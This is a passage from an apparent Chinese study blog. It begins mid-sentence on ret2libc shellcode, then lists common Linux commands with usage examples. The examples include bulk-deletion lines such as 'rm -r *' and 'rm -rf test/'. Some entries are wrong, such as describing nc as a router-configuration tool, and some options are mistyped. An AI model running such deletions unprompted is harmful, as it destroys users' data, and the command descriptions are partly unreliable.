字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br><a href="https://zhuanlan.zhihu.com/p/23487280">一步一步学ROP之linux_x86篇</a></p><ol start="12"><li>Linux命令</li></ol><p>(1) cat - 用于连接文件并打印到标准输出设备上。<br>实例：<br><code>cat -n textfile1 &gt; textfile2</code>  把textfile1的文档内容加上行号后输入textfile2这个文档里<br><code>cat /dev/null &gt; /etc/test.txt</code>  清空 <code>/etc/test.txt</code> 文档内容<br><code>dev/null</code> ：在类 Unix 系统中， <code>/dev/null</code> 称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个 EOF。</p><p>(2) chmod - 控制用户对文件的权限的命令<br>Linux&#x2F;Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。<br>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。<br>u&#x3D;user(文件所有者), g&#x3D;group(文件所有者所在组), o&#x3D;others(所有其它用户), a&#x3D;all(所有用户，相当于ugo)<br><code>+</code> 为指定用户类型增加权限，<code>-</code> 去除指定用户类型的权限，<code>=</code> 设置指定用户权限的设置，也即把用户类型的所有权限重置<br>4&#x3D;r(读), 2&#x3D;w(写), 1&#x3D;x(执行)<br>实例：<br><code>chmod ugo+r file1.txt</code> 将文件file1.txt设为所有人皆可读取<br><code>chmod a+r file1.txt</code> 将文件file1.txt设为所有人皆可读取<br><code>chmod u+x ex1.py</code> 将文件ex1.py文件拥有者增加可执行权限<br><code>chmod 777 file</code> 将文件file设置为所有人皆可读可写可执行</p><p>(3) chown - 用于设置文件所有者和文件关联组的命令<br>chown 需要超级用户 root 的权限才能执行此命令。<br>实例：<br><code>chown root /var/run/httpd.pid</code>  把 <code>/var/run/httpd.pid</code> 的所有者设置root<br><code>chown runoob:runoobgroup file1.txt</code> 将文件file1.txt的拥有者设置为runoob，群体的使用者runoobgroup<br><code>chown runoob:runoobgroup *</code> 将当前前目录下的所有文件和子目录的拥有者皆设为runoob，群体使用者runoobgroup<br><code>chown :512 /home/runoob</code> 把&#x2F;home&#x2F;runoob的关联组设置为512（关联组id），不改变所有者</p><p>(4) chgrp - 用于变更文件或目录的所属群组<br>与 chown 命令不同，chgrp 允许普通用户改变文件所属的组，只要该用户是该组的一员。<br>实例：<br><code>chgrp -v bin log2012.log</code> log2012.log的所属组从root更改为bin<br><code>chgrp --reference=log2012.log log2013.log</code> 根据指定文件改变文件的群组属性。这里将log2013.log文件的群组属性改为和log2012.log相同</p><p>(5) cmp - 用于比较两个文件是否有差异<br>当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不同之处的字符和列数编号。<br>若不指定任何文件名称或是所给予的名称为“-”，则cmp指令会从标准输入设备读取数据。<br>实例：<br><code>cmp prog.o.bak prag.o</code><br>这比较prog.o.bak和prog.o。如果文件相同，则不显示消息。如果文件不同，则显示第一个不同的位置，如：<br><code>prog.o.bak prog.o differ: char 4, line 1</code></p><p>(6) diff - 用于比较文件的差异。<br>diff以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则diff会比较目录中相同文件名的文件，但不会比较其中子目录。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff log2014.log log2013.log  // 比较两个文件</span><br><span class="line">3c3</span><br><span class="line">&lt; 2014-03</span><br><span class="line">---</span><br><span class="line">&gt; 2013-03</span><br><span class="line">8c8</span><br><span class="line">&lt; 2013-07</span><br><span class="line">---</span><br><span class="line">&gt; 2013-08</span><br><span class="line">11,12d10</span><br><span class="line">&lt; 2013-11</span><br><span class="line">&lt; 2013-12</span><br><span class="line"></span><br><span class="line">上面的&quot;3c3&quot;和&quot;8c8&quot;表示log2014.log和log20143log文件在3行和第8行内容有所不同；</span><br><span class="line">&quot;11,12d10&quot;表示第一个文件比第二个文件多了第11和12行。</span><br><span class="line">&quot;&lt;&quot;表示后面文件比前面文件少了1行内容，&quot;&gt;&quot;表示后面文件比前面文件多了1行内容</span><br></pre></td></tr></table></figure><p>(7) file - 用于辨识文件类型<br>通过file指令，我们得以辨识该文件的类型<br>实例：<br>显示文件类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# file install.log</span><br><span class="line">install.log: UTF-8 Unicode text</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -b install.log      &lt;== 不显示文件名称</span><br><span class="line">UTF-8 Unicode text</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -i install.log      &lt;== 显示MIME类别。</span><br><span class="line">install.log: text/plain; charset=utf-8</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -b -i install.log</span><br><span class="line">text/plain; charset=utf-8</span><br></pre></td></tr></table></figure><p>显示符号链接文件类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls -l /var/mail</span><br><span class="line">lrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -&gt; spool/mail</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file /var/mail</span><br><span class="line">/var/mail: symbolic link to `spool/mail&#x27;</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -L /var/mail</span><br><span class="line">/var/mail: directory</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file /var/spool/mail</span><br><span class="line">/var/spool/mail: directory</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -L /var/spool/mail</span><br><span class="line">/var/spool/mail: directory</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(8) find - 用于在指定目录下查找文件和目录<br>它可以使用不同的选项来过滤和限制查找结果<br>实例：<br><code>find . -name file.txt</code> 查找当前目录下名为file.txt的文件<br><code>find . -name &quot;*.c&quot;</code> 将当前目录及其子目录下所有文件后缀为 <code>.c</code> 的文件列出来<br><code>find . -type f</code> 将当前目录及其子目录的所有文件列出<br><code>find /home -size +1M</code> 查找&#x2F;home目录下大于1MB的文件<br><code>find /var/log mtime +7</code> 查找&#x2F;var&#x2F;log目录下在7天前修改过的文件<br><code>find . -ctime 20</code> 将当前目录及其子目录下所有最近20天前更新过的文件列出，不多不少正好20天前的<br><code>find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;</code> 查找&#x2F;var&#x2F;log目录中更改时间在7日以前的普通文件，且在删除之前询问它们<br><code>find . -type f -perm 644 -exec ls -l &#123;&#125; \;</code> 查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件<br><code>find / -type f -size 0 -exec ls -l &#123;&#125; \;</code> 查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径</p><p>(9) git - 是文字模式下的文件管理员<br>git是用来管理文件的程序，它十分类似DOS下的Norton Commander，具有互动式操作界面。它的操作方式和Norton Commander几乎一样。<br>F1 ：执行info指令，查询指令相关信息，会要求您输入欲查询的名称。<br>F2 ：执行cat指令，列出文件内容。<br>F3 ：执行gitview指令，观看文件内容。<br>F4 ：执行vi指令，编辑文件内容。<br>F5 ：执行cp指令，复制文件或目录，会要求您输入目标文件或目录。<br>F6 ：执行mv指令，移动文件或目录，或是更改其名称，会要求您输入目标文件或目录。<br>F7 ：执行mkdir指令，建立目录。<br>F8 ：执行rm指令，删除文件或目录。<br>F9 ：执行make指令，批处理执行指令或编译程序时，会要求您输入相关命令。<br>F10 ：离开git文件管理员。</p><p>(10) cut - 用于显示每行从开头算起num1到num2的文字<br>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cut  [-bn] [file]</span><br><span class="line">cut [-c] [file]</span><br><span class="line">cut [-df] [file]</span><br></pre></td></tr></table></figure><p>使用说明：<br>cut命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。<br>如果不指定File参数，cut命令将读取标准输入。必须指定 -b、-c或-f标志之一。<br>参数：<br>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。<br>-c ：以字符为单位进行分割。<br>-d ：自定义分隔符，默认为制表符。<br>-f ：与-d一起使用，指定显示哪个区域。<br>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</p><p>(11) ln - 功能是为某一个文件在另外一个位置建立一个同步的链接<br>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。<br>不论是硬链接或软链接都不会将原本的档案复制一份，只会占用非常少量的磁碟空间。<br>实例：<br><code>ln -s log2013.log link2013</code> 给文件创建软链接，为log2013.log文件创建软链接link2013，如果log2013.log丢失，link2013将失效<br><code>ln log2013.log ln2013</code> 给文件创建硬链接，为log2013.log创建硬链接ln2013，log2013.log与ln2013的各项属性相同</p><p>(12) more - 类似cat，不过会一页一页的形式显示，更方便使用者逐页阅读<br>而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h<br>实例：<br><code>more -s testfile</code> 逐页显示testfile文档内容，如有连续两行以上空白则以一行空白显示<br><code>more +20 testfile</code> 从第20行开始显示testfile的文档内容<br>常用操作命令：<br>Enter 向下n行，需要定义。默认为1行<br>Ctrl+F 向下滚动一屏<br>空格键 向下滚动一屏<br>Ctrl+B 返回上一屏<br>&#x3D; 输出当前行的行号<br>：f 输出文件名和当前行的行号<br>V 调用vi编辑器<br>!命令 调用Shell，并执行命令<br>q 退出more</p><p>(13) less - less与more相似，less可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。<br>实例：<br><code>less log2013.log</code> 查看文件<br><code>ps -ef |less</code> ps查看进程信息并通过less分页表示<br><code>history |less</code> 查看历史记录并通过less分页表示<br><code>less log2013.log log2014.log</code> 浏览多个文件<br>说明：<br>输入 ：n后，切换到 log2014.log<br>输入 ：p 后，切换到log2013.log<br>附加备注：<br>1、全屏导航<br>ctrl + F - 向前移动一屏<br>ctrl + B - 向后移动一屏<br>ctrl + D - 向前移动半屏<br>ctrl + U - 向后移动半屏<br>2、单行导航<br>j - 下一行<br>k - 上一行<br>3、其它导航<br>G - 移动到最后一行<br>g - 移动到第一行<br>q &#x2F; ZZ - 退出 less 命令<br>4、其它有用的命令<br>v - 使用配置的编辑器编辑当前文件<br>h - 显示 less 的帮助文档<br>&amp;pattern - 仅显示匹配模式的行，而不是整个文件<br>5、标记导航<br>当使用 less 查看大文件时，可以在任何一个位置作标记，可以通过命令导航到标有特定标记的文本位置：<br>ma - 使用 a 标记文本的当前位置<br>‘a - 导航到标记 a 处</p><p>(14) lsattr - 用于显示文件属性<br>用chatter执行改变文件或目录的属性，可执行lsattr指令查询其属性<br>实例：<br><code>lsattr /etc/resolv.conf</code> 使用lsattr命令来显示文件属性<br>输出结果为: <code>----i-------- /etc/resolv.conf</code></p><p>(15) mv - 用来为文件或目录改名，或将文件或目录移入其它位置<br>实例：<br><code>mv aaa bbb</code> 将文件aaa改名为bbb<br><code>mv info/ logs</code> 将info目录放入logs目录中。注意，如果logs目录不存在，则该命令将info改名为logs<br><code>mv /usr/runoob/*  .</code> 将&#x2F;usr&#x2F;runoob下的所有文件和目录移到当前目录下<br><code>mv source_file dest_directory</code> 将文件source_file移动到目标目录dest_directory中</p><p>(16) paste - 用于合并文件的列<br>paste命令会把每个文件以列对列的方式，一列列地加以合并。<br>实例：<br><code>paste file testfile testfile1</code> 使用paste指令将文件file, testfile, testfile1进行合并</p><p>(17) patch - 用于修补文件<br>patch指令让用户利用设置修补文件的方式，修改，更新原始文件。倘若一次仅修改一个文件，可直接在指令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。<br>实例：<br><code>patch -p0 testfile1 testfile.patch</code> 使用patch指令将文件”testfile1”升级，其升级补丁文件为”testfile.patch”</p><p>(18) rm - 用于删除一个文件或目录<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm test.txt</span><br><span class="line">rm：是否删除 一般文件 &quot;test.txt&quot;? y</span><br><span class="line">rm  homework  </span><br><span class="line">rm: 无法删除目录&quot;homework&quot;: 是一个目录</span><br><span class="line">rm  -r  homework  </span><br><span class="line">rm：是否删除 目录 &quot;homework&quot;? y</span><br><span class="line"></span><br><span class="line">rm -r *  // 删除当前目录下的所有文件及目录</span><br><span class="line">rm -rf test/  // 删除目录 test，不管该目录下是否有子目录或文件，都直接删除</span><br></pre></td></tr></table></figure><p>(19) which - 用于查找文件<br>which指令会在环境变量$PATH设置的目录里查找符合条件的文件<br>实例：<br><code>which bash</code>  使用指令”which”查看指令”bash”的绝对路径</p><p>(20) cp - 用于复制文件或目录<br>语法：<br><code>cp file.txt /path/to/destination/</code>  将文件file.txt复制到目录 &#x2F;path&#x2F;to&#x2F;destination&#x2F; 中<br><code>cp -r test/ newtest</code>  使用指令cp将当前目录test下所有文件复制到新目录newtest下<br>注意：用户使用该指令复制目录时，必须使用参数 -r 或者 -R<br><code>cp -i file.txt /path/to/destination/</code>  复制文件，并在目标文件已存在时确认</p><p>(21) whereis - 用于查找文件<br>该指令会在特定目录中查找符合条件的文件。这些文件应属于原始代码、二进制文件，或是帮助文件。<br>该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。<br>实例：<br><code>whereis bash</code> 使用指令“whereis”查看“bash”的位置<br>上面指令执行后输出以下信息：<br><code>bash:/bin/bash/etc/bash.bashrc/usr/share/man/man1/bash.1.gz</code></p><p>(22) awk - 是一种处理文件的语言，是一个强大的文本分析工具<br><a href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令</a></p><p>(23) read - 用于从标准输入读取数值<br>read 内部命令被用来从标准输入读取单行数据。这个命令可以用来读取键盘输入，当使用重定向的时候，可以读取文件中的一行数据。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#这里默认会换行  </span><br><span class="line">echo &quot;输入网站名: &quot;  </span><br><span class="line">#读取从键盘的输入  </span><br><span class="line">read website  </span><br><span class="line">echo &quot;你输入的网站名是 $website&quot;  </span><br><span class="line">exit 0  #退出</span><br></pre></td></tr></table></figure><p>测试结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入网站名: </span><br><span class="line">www.x.com</span><br><span class="line">你输入的网站名是 www.x.com</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-read.html">Linux read 命令</a></p><p>(24) grep - 用于查找文件里符合条件的字符串或正则表达式<br>grep指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设grep指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 <code>-</code> ，则grep指令会从标准输入设备读取数据。<br>实例：<br><code>grep hello file.txt</code> 在文件file.txt中查找字符串“hello”，并打印匹配的行<br><code>grep -r -n pattern dir/</code> 在文件夹dir中递归查找所有文件中匹配正则表达式“pattern”的行，并打印匹配行所在的文件名和行号<br><code>echo &quot;hello world&quot; | grep -c world</code> 在标准输入中查找字符串“hello world”，并只打印匹配的行数<br><a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令</a></p><p>(25) sort - 用于将文本文件内容加以排序<br>sort可针对文本文件的内容，以行为单位来排序<br>实例：<br><code>sort testfile</code> 使用sort命令以默认的方式对文件的行进行排序</p><p>(26) tr - 用于转换或删除文件中的字符<br>tr命令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备<br>实例：<br><code>cat testfile |tr a-z A-Z</code> 将文件testfile中的小写字母全部转化为大写字母</p><p>(27) let - 是BASH中用于计算的工具，用于执行一个或多个表达式，变量计算中不需要加上$来表示变量。如果表达式中包含了空格或其它特殊字符，则必须引起来。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">let a=5+4</span><br><span class="line">let b=9-3 </span><br><span class="line">echo $a $b</span><br></pre></td></tr></table></figure><p>(28) cd - 用于改变当前工作目录的命令，切换到指定的路径<br>若目录名称省略，则变换至使用者的home目录(也就是刚login时所在的目录)<br>另外， <code>~</code> 也表示home目录的意思， <code>.</code> 则是表示目前所在的目录， <code>..</code> 则表示目前目录位置的上一目录<br>实例：<br><code>cd /usr/bin</code> 切换到 &#x2F;usr&#x2F;bin&#x2F;目录<br><code>cd ..</code> 切换到上级目录<br><code>cd ~</code> 切换到用户主目录<br><code>cd -</code> 切换到上次访问的目录</p><p>(29) df - 用于显示目前在Linux系统上的文件系统磁盘使用情况统计<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df  //显示文件系统的磁盘使用情况统计</span><br><span class="line">Filesystem     1K-blocks    Used     Available Use% Mounted on </span><br><span class="line">/dev/sda6       29640780 4320704     23814388  16%     / </span><br><span class="line">udev             1536756       4     1536752    1%     /dev </span><br><span class="line">tmpfs             617620     888     616732     1%     /run </span><br><span class="line">none                5120       0     5120       0%     /run/lock </span><br><span class="line">none             1544044     156     1543888    1%     /run/shm </span><br></pre></td></tr></table></figure><p>第一列指定文件系统的名称，第二列指定一个特定的文件系统1K-块1K是1024字节为单位的总内存。用和可用列正在使用中，分别指定的内存量。<br>使用列指定使用的内存的百分比，而最后一栏”安装在”指定的文件系统的挂载点。<br><code>df --total</code> 显示所有的信息，输出的末尾，包含一个额外的行，显示总的每一列<br><code>df -h</code> 通过-h选项可以产生可读的格式df命令的输出</p><p>(30) du - 用于显示目录或文件的大小<br>du会显示指定的目录或文件所占用的磁盘空间<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">du  显示目录或文件所占空间</span><br><span class="line">608     ./test6</span><br><span class="line">308     ./test4</span><br><span class="line">4       ./scf/lib</span><br><span class="line">4       ./scf/service/deploy/product</span><br><span class="line">4       ./scf/service/deploy/info</span><br><span class="line">12      ./scf/service/deploy</span><br><span class="line">16      ./scf/service</span><br><span class="line">4       ./scf/doc</span><br><span class="line">4       ./scf/bin</span><br><span class="line">32      ./scf</span><br><span class="line">8       ./test3</span><br><span class="line">1288    .</span><br></pre></td></tr></table></figure><p><code>du -h test</code> 方便阅读的格式显示test目录所占空间情况</p><p>(31) mkdir - 用于创建目录<br>实例：<br><code>mkdir test</code> 在工作目录下，创建一个名为test的目录</p><p>(32) pwd - 用于显示工作目录<br>执行pwd指令可立刻得知目前所在的工作目录的绝对名称<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwd  // 查看当前所在目录</span><br><span class="line">/root/test           #输出结果</span><br></pre></td></tr></table></figure><p>(33) mount - 是经常会使用到的命令，它用于挂载Linux系统外的文件<br>实例：<br><code>mount /dev/hda1 /mnt</code> 将&#x2F;dev&#x2F;hda1挂在&#x2F;mnt之下</p><p>(34) rmdir - 删除空的目录<br>实例：<br><code>rmdir AAA</code> 将工作目录下，名为AAA的子目录删除</p><p>(35) ls - 用于显示指定工作目录下的内容(列出目前工作目录所含的文件及子目录)<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -l    # 以长格式显示当前目录中的文件和目录</span><br><span class="line">ls -a    # 显示当前目录中的所有文件和目录，包括隐藏文件</span><br><span class="line">ls -lh   # 以人类可读的方式显示当前目录中的文件和目录大小</span><br><span class="line">ls -t    # 按照修改时间排序显示当前目录中的文件和目录</span><br><span class="line">ls -l /etc/passwd  # 显示/etc/passwd文件的详细信息</span><br><span class="line">ls /     # 列出根目录(\)下的所有目录</span><br></pre></td></tr></table></figure><p>(36) telnet - 用于远程输入<br>执行telnet指令开启终端机阶段作业，并登入远端主机</p><p>(37) nc - 用于设置路由器<br>执行本指令可设置路由器的相关参数</p><p>(38) ifconfig - 用于显示或设置网络设备<br>ifconfig可设置网络设备的状态，或是显示目前的设置</p><p>(39) netstat - 用于显示网络状态<br>利用 netstat 指令可让你得知整个 Linux 系统的网络情况<br>实例：<br><code>netstat -a</code> 显示详细的网络状况<br><code>netstat -i</code> 显示网卡列表<br><code>netstat -s</code> 显示网络统计信息<br><code>netstat -l</code> 显示监听的套接口</p><p>(40) ping - 用于检测与另一个主机之间的网络连接<br>执行 ping 指令会使用 ICMP（Internet Control Message Protocol） 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常<br>实例：<br><code>ping www.x.com //ping主机</code></p><p>(41) adduser - 用于新增使用者账号或更新预设的使用者资料<br>adduser与useradd为同一指令（经由符号连接symbolic link）<br>使用权限：系统管理员<br>adduser 是增加使用者。相对的，也有删除使用者的指令 userdel，语法为 <code>userdel [login ID]</code><br>实例：<br><code>adduser kk</code> 添加一个一般用户<br><code>adduser -g root kk</code> 为添加的用户指定相应的用户组<br><code>adduser -r kk</code> 创建一个系统用户<br><code>adduser -d /home/myf kk</code> 为新添加的用户指定&#x2F;home目录</p><p>(42) useradd - 用于建立用户账号<br>useradd 可用来建立用户帐号。帐号建好之后，再用 passwd 设定帐号的密码。而可用 userdel 删除帐号。使用 useradd 指令所建立的帐号，实际上是保存在 &#x2F;etc&#x2F;passwd 文本文件中<br>实例：<br><code>useradd tt</code> 添加一般用户<br><code>useradd -g root tt</code> 为添加的用户指定相应的用户组<br>和adduser命令相同</p><p>(43) date - 用来显示或设定系统的日期和时间<br>实例：<br><code>date</code> 显示当前时间<br><code>date + &quot;%Y-%m-%d&quot;</code> 格式化输出<br><code>date -s</code> 设置当前时间，只有root权限才能设置，其它只能查看</p><p>(44) exit - 用于退出目前的shell<br>实例：<br><code>exit</code> 退出终端</p><p>(45) finger - 可让使用者查询其它使用者的资料<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">finger -l  //列出当前登录用户的相关信息</span><br><span class="line">Login: root Name: root</span><br><span class="line">Directory: /root Shell: /bin/bash</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on :0 (messages off)</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on pts/1 32 days 22 hours idle</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on pts/3 4 hours 5 minutes idle</span><br><span class="line">(messages off)</span><br><span class="line">On since Wed May 12 18:08 (CST) on pts/4 from 192.168.1.10</span><br><span class="line">On since Wed May 12 18:35 (CST) on pts/5 from 192.168.1.10</span><br><span class="line">7 minutes 54 seconds idle</span><br><span class="line">On since Wed May 12 14:37 (CST) on pts/2 from 192.168.1.10</span><br><span class="line">3 hours 14 minutes idle</span><br><span class="line">On since Wed May 12 14:53 (CST) on pts/7 34 minutes 25 seconds idle</span><br><span class="line">(messages off)</span><br><span class="line">On since Wed May 12 16:53 (CST) on pts/8 from 192.168.1.10</span><br><span class="line">30 minutes 18 seconds idle</span><br><span class="line">Mail last read Mon Mar 31 04:02 2008 (CST)</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure><p><code>finger -m hnlinux</code> 显示指定用户信息<br><code>finger -m root@192.168.1.1</code> 显示远程用户信息</p><p>(46) sleep - 用来将目前动作延迟一段时间<br>使用权限：所有使用者<br>实例：<br><code>sleep 5m</code> 休眠5m<br><code>date;sleep 1m;date</code> 显示目前时间后延迟1分钟，之后再次显示时间</p><p>(47) kill - 用于删除执行中的程序或工作<br>kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15)，可将指定程序终止。若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 jobs 指令查看。<br>实例：<br><code>kill 12345</code> 杀死进程<br><code>kill -KILL 123456</code> 强制杀死进程<br><code>kill -9 123456</code> 彻底杀死进程<br><code>kill -u hnlinux</code> 杀死指定用户所有进程</p><p>(48) last - 用于显示用户最近的登录信息<br>单独执行last命令，它会读取位于&#x2F;var&#x2F;log&#x2F;目录下，名称为wtmp的文件，并把该文件记录登录的用户名，全部显示出来<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last -R -2  #显示两行，并省略主机名hostname的列</span><br><span class="line">root     pts/0        Thu Apr 28 18:06   still logged in</span><br><span class="line">root     pts/0        Tue Apr 26 09:06 - 19:36  (10:30)</span><br><span class="line"></span><br><span class="line">wtmp begins Sun Apr  3 13:11:25 2022</span><br></pre></td></tr></table></figure><p><code>last</code> 一般显示方法</p><p>(49) shutdown - 用来进行关机程序<br>在关机以前传送讯息给所有使用者正在执行的程序，shutdown也可以用来重开机<br>使用权限：系统管理者<br>实例：<br><code>shutdown -h now</code> 立即关机<br><code>shutdown -h 10</code> 10分钟后关机<br><code>shutdown -r now</code> 重新启动计算机</p><p>(50) sudo - 以系统管理者的身份执行命令<br>使用权限：在 &#x2F;etc&#x2F;sudoers 中有出现的使用者<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ls</span><br><span class="line">[sudo] password for hnlinux: </span><br><span class="line">hnlinux is not in the sudoers file. This incident will be reported.</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-sudo.html">Linux sudo命令</a></p><p>(51) ps - 用于显示当前进程状态，类似于Windows的任务管理器<br>实例：<br><code>ps -ef | grep 进程关键字</code> 查找指定进程格式<br><code>ps -A</code> 显示进程信息<br><code>ps -u root</code> 显示root进程用户信息</p><p>(52) wc - 统计指定的文件中字节数、字数、行数，并将统计结果输出<br>实例：<br><code>wc text.txt</code> 查找文件的行数 单词数 字节数 文件名。 结果: <code>7     8     70     test.txt</code><br><code>cat text.txt | wc -l</code> 统计输出结果的行数</p><p>(53) locate - 通过搜寻系统内建文档数据库达到快速找到档案<br>默认情况下 locate 命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是 locate 所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb 每天会跑一次，可以由修改 crontab 来更新设定值 (etc&#x2F;crontab)。<br>locate 与 find 命令相似，可以使用如 *、? 等进行正则匹配查找<br>实例：<br><code>locate pwd</code> 查找和pwd相关的所有文件(文件名中包含pwd)<br><code>locate /etc/sh</code> 搜索etc目录下所有以sh开头的文件<br><code>locate -r &#39;^/var.*reason$&#39;  //(其中.表示一个字符，*表示任务多个；.*表示任意多个字符)</code> 查找&#x2F;var目录下，以reason结尾的文件</p><p>(54) tail - 